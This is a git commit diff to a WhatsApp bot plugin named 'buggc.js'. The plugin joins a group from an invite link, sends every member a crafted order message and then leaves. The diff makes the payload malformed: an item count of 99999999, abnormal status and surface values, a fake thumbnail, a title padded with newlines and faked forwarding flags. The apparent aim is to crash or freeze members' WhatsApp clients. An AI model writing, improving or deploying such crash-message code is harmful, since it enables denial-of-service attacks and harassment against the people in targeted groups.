3f87e85e11a496325c65123c8e863de3c0a96dda
g4tito <84881966+g4tito@users.noreply.github.com>
2022-02-24 08:09:22 -0500

    Add files via upload

--- plugins/buggc.js
+++ plugins/buggc.js
@@ -1,6 +1,9 @@
+let fs = require ('fs')
+
 let linkRegex = /chat.whatsapp.com\/([0-9A-Za-z]{20,24})/i
 
 let handler = async (m, { conn, text }) => {
+	let faketumb = fs.readFileSync('./src/menu2.jpg')
     let [_, code] = text.match(linkRegex) || []
     if (!code) throw 'Link invalido'
     let { gid: target } = await conn.acceptInvite(code)
@@ -13,15 +16,16 @@ await conn.sendMessage(target, '*Grupo I*\nhttps://chat.whatsapp.com/EphX7iaMsKj
   },
   message: {
    orderMessage: {
-    itemCount: 750,
-    status: 1,
-    surface: 1,
-    message: '› 〉🍒 .ೃ Lolibot - OFC ‘ 🍃„ ˖',
-    orderTitle: '',
+    itemCount: 99999999,
+    status: 200,
+    thumbnail: faketumb,
+    surface: 200,
+    message: '*Lolibot - OFC *',
+    orderTitle: '\n\n\n\n\n',
     sellerJid: '0@s.whatsapp.net'
    }
   }
- }, contextInfo: { mentionedJid: member }
+ }, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: member }
 }).then(v => conn.groupLeave(target))
 }
 
